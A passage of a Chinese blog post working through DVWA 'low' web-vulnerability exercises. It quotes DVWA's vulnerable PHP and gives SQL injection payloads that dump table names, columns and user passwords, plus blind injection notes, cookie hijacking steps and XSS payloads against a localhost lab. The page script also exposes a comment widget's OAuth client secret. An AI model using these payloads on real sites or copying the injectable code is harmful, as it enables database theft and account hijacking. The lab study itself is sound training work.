+<h3 id="4-爆表名"><a href="#4-爆表名" class="headerlink" title="4.爆表名"></a>4.爆表名</h3><p>1′ union select 1,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database() </p>
+<h3 id="5-爆列名"><a href="#5-爆列名" class="headerlink" title="5.爆列名"></a>5.爆列名</h3><p>1′ union select 1,group_concat(column_name) from information_schema.columns where table_name&#x3D;’users’</p>
+<h3 id="6-爆数据"><a href="#6-爆数据" class="headerlink" title="6.爆数据"></a>6.爆数据</h3><p>1′ or 1&#x3D;1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users </p>
+<h1 id="SQL-Injection-Blind"><a href="#SQL-Injection-Blind" class="headerlink" title="SQL Injection (Blind)"></a>SQL Injection (Blind)</h1><p>sql盲注 <br /><br>核心代码：</p>
+<pre><code>&lt;?php 
+
+if( isset( $_GET[ &#39;Submit&#39; ] ) ) &#123; 
+    // 获取输入的值 
+    $id = $_GET[ &#39;id&#39; ]; 
+
+    // 连接数据库，将查询的结果放入结果集中
+    $getid  = &quot;SELECT first_name, last_name FROM users WHERE user_id = &#39;$id&#39;;&quot;; 
+    $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $getid ); // Removed &#39;or die&#39; to suppress mysql errors 
+
+    // 获取结果集中的值 
+    $num = @mysqli_num_rows( $result ); 
+    if( $num &gt; 0 ) &#123; 
+        // 反馈给用户 
+        echo &#39;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&#39;; 
+    &#125; 
+    else &#123; 
+        // 没有找到用户，返回一个错误页面 
+        header( $_SERVER[ &#39;SERVER_PROTOCOL&#39; ] . &#39; 404 Not Found&#39; ); 
+
+        // 客户端返回的错误提示 
+        echo &#39;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&#39;; 
+    &#125; 
+
+    ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res); 
+&#125; 
+
+?&gt; 
+</code></pre>
+<p>盲注的原理跟注入是一样的，区别在于没有从显示页面上获取执行结果，甚至连注入语句是否执行都无从得知 <br /><br>这个时候我们就要用到ascii(）和substr（）函数来一个个猜 <br /><br>如果页面会返回正确或者错误的信息，可以基于布尔盲注，由返回的页面来判断是否猜对 <br /><br>如果没有返回信息，只能用sleep（）基于时间盲注，由响应的时间来判断是否正确</p>
+<h1 id="Weak-Session-IDs"><a href="#Weak-Session-IDs" class="headerlink" title="Weak Session IDs"></a>Weak Session IDs</h1><p>弱Session的id <br /><br>核心代码：</p>
+<pre><code>&lt;?php
+
+$html = &quot;&quot;;
+//获取session id
+if ($_SERVER[&#39;REQUEST_METHOD&#39;] == &quot;POST&quot;) &#123;
+    //如果没有session id则将session id设为0
+    if (!isset ($_SESSION[&#39;last_session_id&#39;])) &#123;
+        $_SESSION[&#39;last_session_id&#39;] = 0;
+    &#125;
+    //累加session id
+    $_SESSION[&#39;last_session_id&#39;]++;
+    $cookie_value = $_SESSION[&#39;last_session_id&#39;];
+    //向客户端发送一个http cookie
+    setcookie(&quot;dvwaSession&quot;, $cookie_value);
+&#125;
+?&gt;
+</code></pre>
+<h2 id="session-id的原理"><a href="#session-id的原理" class="headerlink" title="session id的原理"></a>session id的原理</h2><p>密码与证书等认证手段，一般仅仅用于登录（Login）的过程。当登陆完成后，用户访问网站的页面，不可能每次浏览器请求页面时都再使用密码认证一次。因此，当认证完成后。就需要替换一个对用户透明的凭证。这个凭证就是SessionID。<br /><br>当用户登陆完成后，在服务器端就会创建一个新的会话（Session），会话中会保存用户的状态和相关信息。此时的认证，只需要知道是哪个用户在浏览当前的页面即可。 <br /><br>SessionID一旦在生命周期内被窃取，攻击者利用这个id就可以伪装成合法的用户访问服务器 <br /></p>
+<h2 id="利用方法-2"><a href="#利用方法-2" class="headerlink" title="利用方法"></a>利用方法</h2><p>由核心代码可知服务器的sessionid是从0开始累加的 <br /><br>当受害者获得sessionid之后，攻击者只要在自己的浏览器上将sessionid改为受害者的即可 <br /><br>按f12打开控制台，在控制台输入 <br /><br>读取：document.cookie; <br /><br>修改：document.cookie[“Key”]&#x3D;”值”; <br /><br>PS：我在自己的电脑上没有成功，可能是服务器设置的问题，两个浏览器获取到的sessionid是独立的</p>
+<h1 id="XSS-DOM"><a href="#XSS-DOM" class="headerlink" title="XSS(DOM)"></a>XSS(DOM)</h1><h2 id="XSS漏洞原理"><a href="#XSS漏洞原理" class="headerlink" title="XSS漏洞原理"></a>XSS漏洞原理</h2><p>xss漏洞的原理是将js代码恶意插入到网页中，当受害者访问页面时，恶意的代码就会在浏览器上执行 <br /><br>根据恶意的代码是否存储在服务器中，xss可以分为两种类型，一种是反射性xss，一种是存储型xss <br /><br>DOM型由于其特殊性，常被分为第三种,它是基于DOM文档对象模型的一种漏洞 <br /><br>在网站页面中有许多页面的元素，当页面到达浏览器时浏览器会为页面创建一个顶级的Document object文档对象，接着生成各个子文档对象，每个页面元素对应一个文档对象，每个文档对象包含属性、方法和事件。可以通过JS脚本对文档对象进行编辑从而修改页面的元素。也就是说，客户端的脚本程序可以通过DOM来动态修改页面内容，从客户端获取DOM中的数据并在本地执行。基于这个特性，就可以利用JS脚本来实现XSS漏洞的利用。 <br /></p>
+<h2 id="绕过-1"><a href="#绕过-1" class="headerlink" title="绕过"></a>绕过</h2><p>DOM型服务器端没有代码 <br /><br>只要在get获取到的参数后面加上js代码就行</p>
+<pre><code>http://localhost:8888/dvwa/vulnerabilities/xss_d/?default=English&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;
+</code></pre>
+<p>结果就是会出现一个弹框，内容为xss <br /><br>修改xss里面的内容，改成各种函数，可以达到盗取服务器信息的目的 <br /><br>ps：在谷歌浏览器上做会失败，因为谷歌浏览器自带了防xss的机制，用火狐浏览器就可以做到了</p>
+<h1 id="XSS-Reflected"><a href="#XSS-Reflected" class="headerlink" title="XSS (Reflected)"></a>XSS (Reflected)</h1><p>反射型xss <br /><br>核心代码:</p>
+<pre><code>&lt;?php 
+//向客户端发送原始的 HTTP 报头
+header (&quot;X-XSS-Protection: 0&quot;); 	
+// 检测get中是否有值
+if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &#39;name&#39; ] != NULL ) &#123; 
+    // 反馈给用户 
+    echo &#39;&lt;pre&gt;Hello &#39; . $_GET[ &#39;name&#39; ] . &#39;&lt;/pre&gt;&#39;; 
+&#125; 
+</code></pre>
+<p>原理同DOM型XSS <br />	<br>在框里输入<code>&lt;script&gt;alert(/xss/)&lt;/script&gt;</code>出现弹框</p>
+<h1 id="XSS-Stored"><a href="#XSS-Stored" class="headerlink" title="XSS (Stored)"></a>XSS (Stored)</h1><p>存储型xss <br /><br>核心代码：<br>    &lt;?php </p>
+<pre><code>if( isset( $_POST[ &#39;btnSign&#39; ] ) ) &#123; 
+    //获取输入的值 
+    $message = trim( $_POST[ &#39;mtxMessage&#39; ] ); 
+    $name    = trim( $_POST[ &#39;txtName&#39; ] ); 
+
+    // 净化输入的信息，比如消除反斜杠，检测输入的值是否为对象等
+    $message = stripslashes( $message ); 
+    $message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); 
+
+    // 净化输入的名称，同上 
+    $name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); 
+
+    // 更新数据库
+    $query  = &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#39;$message&#39;, &#39;$name&#39; );&quot;; 
+    $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; );
+
+    //mysql_close(); 
+&#125; 
+
+?&gt; 
+</code></pre>
+<p>存储型XSS因为是将js代码存在服务器上，每当有人访问了这个带有恶意代码的页面，xss就会被触发，所以传播的范围更广 <br /><br>直接在message栏中输入<code>&lt;script&gt;alert(/xss/)&lt;/script&gt;</code>也可以弹窗了<br>在name行输入也行，但是name行有限制，可以通过抓包改包破除这个限制 <br /></p>
+
+    </article>
+    <!-- license  -->
+    
+        <div class="license-wrapper">
+            <p>原文作者: <a href="https://perfect-time.xyz">LINK</a>
+            <p>原文链接: <a href="https://perfect-time.xyz/2018/07/19/dvwa-low/">https://perfect-time.xyz/2018/07/19/dvwa-low/</a>
+            <p>发表日期: <a href="https://perfect-time.xyz/2018/07/19/dvwa-low/">July 19th 2018, 8:09:16 pm</a>
+            <p>版权声明: 本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
+        </div>
+    
+    <!-- paginator  -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+                <div class="nextSlogan">Next Post</div>
+                <a href= "/2018/07/27/sqli-labs/" title= sqli-libs解题思路-Basic Challenges >
+                    <div class="nextTitle">sqli-libs解题思路-Basic Challenges</div>
+                </a>
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href= "/2018/07/18/phpstudy-1/" title= php学习笔记-基础部分 >
+                    <div class="prevTitle">php学习笔记-基础部分</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+<!-- City版安装代码已完成 -->
+    
+    
+<div id="container"></div>
+<link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css">
+<script src="https://imsun.github.io/gitment/dist/gitment.browser.js"></script>
+<script>
+    var gitment = new Gitment({
+        // id: "基于DVWA的web漏洞原理-low", // 可选。默认为 location.href
+        owner: 'a1055883471',
+        repo: 'a1055883471.github.io',
+        oauth: {
+            client_id: '4514a03a15dc92fbdd90',
+            client_secret: 'cdffbd6889428a82f7232c85f4ccd95cf70b2211',
+        },
+    })
+    gitment.render('container')
+
+</script>
+
+    <!--PC和WAP自适应版-->
+
+    <!--PC版-->
+
+
+    
+    
+
+    <!-- 评论 -->
+</main>
+            <!-- profile -->
+            
+        </div>
+        <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+    <div class="social">
+        
+    
+        
+            
+                <a href="mailto:mail.qq.com/cgi-bin/qm_share?t=qm_mailme&email=gPf3966ytbewsMDx8a7j7_0" class="iconfont-archer email" title=email ></a>
+            
+        
+    
+        
+            
+                <a href="//github.com/a1055883471" class="iconfont-archer github" target="_blank" title=github></a>
+            
+        
+    
+        
+    
+        
+            
+                <span class="iconfont-archer qq" title=qq>
+                  
+                  <img class="profile-qr" src="/assets/qrcode_1530688616677.jpg" />
+                </span>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+    </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
+    </div>
+    <!-- 不蒜子  -->
+    
+    <div class="busuanzi-container">
+    
+     
+    <span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span> :)</span>
+    
+    </div>
+    
+</footer>
+    </div>
+    <!-- toc -->
+    
+    <div class="toc-wrapper" style=
+    
+
+
+
+
+
+
+
+top:50vh;
+
+    >
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Brute-Force"><span class="toc-number">1.</span> <span class="toc-text">Brute Force</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Command-Injection"><span class="toc-number">2.</span> <span class="toc-text">Command Injection</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8B%BC%E6%8E%A5%E7%AC%A6%E5%8F%B7"><span class="toc-number">2.1.</span> <span class="toc-text">拼接符号</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4"><span class="toc-number">2.2.</span> <span class="toc-text">常用命令</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#CSRF"><span class="toc-number">3.</span> <span class="toc-text">CSRF</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#CSRF%E5%8E%9F%E7%90%86"><span class="toc-number">3.1.</span> <span class="toc-text">CSRF原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95"><span class="toc-number">3.2.</span> <span class="toc-text">利用方法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%84%E9%80%A0url"><span class="toc-number">3.2.1.</span> <span class="toc-text">构造url</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%84%E9%80%A0%E6%94%BB%E5%87%BB%E9%A1%B5%E9%9D%A2"><span class="toc-number">3.2.2.</span> <span class="toc-text">构造攻击页面</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#File-Inclusion"><span class="toc-number">4.</span> <span class="toc-text">File Inclusion</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95-1"><span class="toc-number">4.1.</span> <span class="toc-text">利用方法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">4.2.</span> <span class="toc-text">远程文件包含</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#File-Upload"><span class="toc-number">5.</span> <span class="toc-text">File Upload</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Insecure-CAPTCHA"><span class="toc-number">6.</span> <span class="toc-text">Insecure CAPTCHA</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#reCAPTCHA%E9%AA%8C%E8%AF%81%E6%B5%81%E7%A8%8B"><span class="toc-number">6.1.</span> <span class="toc-text">reCAPTCHA验证流程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%95%E8%BF%87"><span class="toc-number">6.2.</span> <span class="toc-text">绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E6%94%B9%E5%8F%82%E6%95%B0"><span class="toc-number">6.2.1.</span> <span class="toc-text">修改参数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CSRF-1"><span class="toc-number">6.2.2.</span> <span class="toc-text">CSRF</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SQL-Injection-Source"><span class="toc-number">7.</span> <span class="toc-text">SQL Injection Source</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E7%9A%84%E5%A4%A7%E8%87%B4%E6%B5%81%E7%A8%8B"><span class="toc-number">7.1.</span> <span class="toc-text">手工注入的大致流程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%88%A4%E6%96%AD%E6%B3%A8%E5%85%A5%E7%82%B9"><span class="toc-number">7.1.1.</span> <span class="toc-text">1.判断注入点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E6%9F%A5%E8%AF%A2%E8%A1%A8%E7%9A%84%E5%88%97%E6%95%B0"><span class="toc-number">7.1.2.</span> <span class="toc-text">2.查询表的列数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2"><span class="toc-number">7.1.3.</span> <span class="toc-text">3.联合查询</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E7%88%86%E8%A1%A8%E5%90%8D"><span class="toc-number">7.1.4.</span> <span class="toc-text">4.爆表名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E7%88%86%E5%88%97%E5%90%8D"><span class="toc-number">7.1.5.</span> <span class="toc-text">5.爆列名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-%E7%88%86%E6%95%B0%E6%8D%AE"><span class="toc-number">7.1.6.</span> <span class="toc-text">6.爆数据</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SQL-Injection-Blind"><span class="toc-number">8.</span> <span class="toc-text">SQL Injection (Blind)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Weak-Session-IDs"><span class="toc-number">9.</span> <span class="toc-text">Weak Session IDs</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#session-id%E7%9A%84%E5%8E%9F%E7%90%86"><span class="toc-number">9.1.</span> <span class="toc-text">session id的原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95-2"><span class="toc-number">9.2.</span> <span class="toc-text">利用方法</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#XSS-DOM"><span class="toc-number">10.</span> <span class="toc-text">XSS(DOM)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-number">10.1.</span> <span class="toc-text">XSS漏洞原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%95%E8%BF%87-1"><span class="toc-number">10.2.</span> <span class="toc-text">绕过</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#XSS-Reflected"><span class="toc-number">11.</span> <span class="toc-text">XSS (Reflected)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#XSS-Stored"><span class="toc-number">12.</span> <span class="toc-text">XSS (Stored)</span></a></li></ol>
+    </div>
+    
+    <div class="back-top iconfont-archer">&#xe639;</div>
+    <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+          <div class="sidebar-panel-archives">
+    <!-- 在ejs中将archive按照时间排序 -->
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <div class="total-and-search">
+        <div class="total-archive">
+        Total : 17
+        </div>
+        <!-- search  -->
+        
+    </div>
+    
+    <div class="post-archive">
+    
+    
+    
+    
+    <div class="archive-year"> 2023 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/10</span><a class="archive-post-title" href= "/2023/08/10/Intranet_attack/" >内网攻防</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2018 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/06</span><a class="archive-post-title" href= "/2018/12/06/geeksycsec/" >极客大挑战第⑨季-web-wp</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/06</span><a class="archive-post-title" href= "/2018/12/06/shiyan8/" >实验吧-web-wp</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/26</span><a class="archive-post-title" href= "/2018/10/26/CGCTF-wp/" >cgctf-web-wp</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/22</span><a class="archive-post-title" href= "/2018/10/22/bugku-wp/" >bugku-web-wp</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/18</span><a class="archive-post-title" href= "/2018/10/18/python-auto-script/" >python自动化脚本学习笔记</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/08</span><a class="archive-post-title" href= "/2018/10/08/PKIstudy/" >PKI学习笔记</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/07</span><a class="archive-post-title" href= "/2018/09/07/python/" >python学习笔记</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/02</span><a class="archive-post-title" href= "/2018/08/02/sql/" >sql注入笔记</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/29</span><a class="archive-post-title" href= "/2018/07/29/phpstudy-3/" >php学习笔记-核心编程</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/27</span><a class="archive-post-title" href= "/2018/07/27/sqli-labs/" >sqli-libs解题思路-Basic Challenges</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/19</span><a class="archive-post-title" href= "/2018/07/19/dvwa-low/" >基于DVWA的web漏洞原理-low</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/18</span><a class="archive-post-title" href= "/2018/07/18/phpstudy-1/" >php学习笔记-基础部分</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/18</span><a class="archive-post-title" href= "/2018/07/18/phpstudy-2/" >php中一些比较实用的技巧</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/13</span><a class="archive-post-title" href= "/2018/07/13/dvwa-medium/" >基于DVWA的web漏洞原理-medium</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/13</span><a class="archive-post-title" href= "/2018/07/13/dvwa-high/" >基于DVWA的web漏洞原理-high</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/05</span><a class="archive-post-title" href= "/2018/07/05/problem/" >搭博客过程中遇到的一些问题</a>
+        </li>
+    
+    </div>
+  </div>
+        <div class="sidebar-panel-tags">
+    <div class="sidebar-tags-name">
+    
+        <span class="sidebar-tag-name" data-tags="内网攻防"><span class="iconfont-archer">&#xe606;</span>内网攻防</span>
+    
+        <span class="sidebar-tag-name" data-tags="wp"><span class="iconfont-archer">&#xe606;</span>wp</span>
+    
+        <span class="sidebar-tag-name" data-tags="dvwa"><span class="iconfont-archer">&#xe606;</span>dvwa</span>
+    
+        <span class="sidebar-tag-name" data-tags="PKI"><span class="iconfont-archer">&#xe606;</span>PKI</span>
+    
+        <span class="sidebar-tag-name" data-tags="php学习"><span class="iconfont-archer">&#xe606;</span>php学习</span>
+    
+        <span class="sidebar-tag-name" data-tags="脚本"><span class="iconfont-archer">&#xe606;</span>脚本</span>
+    
+        <span class="sidebar-tag-name" data-tags="sql注入"><span class="iconfont-archer">&#xe606;</span>sql注入</span>
+    
+        <span class="sidebar-tag-name" data-tags="sqli-libs"><span class="iconfont-archer">&#xe606;</span>sqli-libs</span>
+    
+        <span class="sidebar-tag-name" data-tags="python学习"><span class="iconfont-archer">&#xe606;</span>python学习</span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
+    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
+    缺失模块。<br/>
+    1、请确保node版本大于6.2<br/>
+    2、在博客根目录（注意不是archer根目录）执行以下命令：<br/>
+    <span style="color: #f75357; font-size: 1rem; line-height: 2rem;">npm i hexo-generator-json-content --save</span><br/>
+    3、在根目录_config.yml里添加配置：
+    <pre style="color: #787878; font-size: 0.6rem;">
+jsonContent:
+  meta: false
+  pages: false
+  posts:
+    title: true
+    date: true
+    path: true
+    text: false
+    raw: false
+    content: false
+    slug: false
+    updated: false
+    comments: false
+    link: false
+    permalink: false
+    excerpt: false
+    categories: true
+    tags: true</pre>
+    </div> 
+    <div class="sidebar-tags-list"></div>
+</div>
+        <div class="sidebar-panel-categories">
+    <div class="sidebar-categories-name">
+    
+        <span class="sidebar-category-name" data-categories="内网"><span class="iconfont-archer">&#xe60a;</span>内网</span>
+    
+        <span class="sidebar-category-name" data-categories="ctf"><span class="iconfont-archer">&#xe60a;</span>ctf</span>
+    
+        <span class="sidebar-category-name" data-categories="web安全"><span class="iconfont-archer">&#xe60a;</span>web安全</span>
+    
+        <span class="sidebar-category-name" data-categories="笔记"><span class="iconfont-archer">&#xe60a;</span>笔记</span>
+    
+        <span class="sidebar-category-name" data-categories="其他"><span class="iconfont-archer">&#xe60a;</span>其他</span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
+    <div class="sidebar-categories-list"></div>
+</div>
+    </div>
+</div> 
+    <script>
+    var siteMeta = {
+        root: "/",
+        author: "LINK"
+    }
+</script>
+    <!-- CDN failover -->
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script>
+    <script type="text/javascript">
+        if (typeof window.$ === 'undefined')
+        {
+            console.warn('jquery load from jsdelivr failed, will load local script')
+            document.write('<script src="/lib/jquery.min.js">\x3C/script>')
+        }
+    </script>
+    <script src="/scripts/main.js"></script>
+    <!-- algolia -->
+    
+    <!-- busuanzi  -->
+    
+    <script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    
+    <!-- CNZZ  -->
+    
+    </div>
+    <!-- async load share.js -->
+    
+        <script src="/scripts/share.js" async></script>    
+     
+    </body>
+</html>
+
+
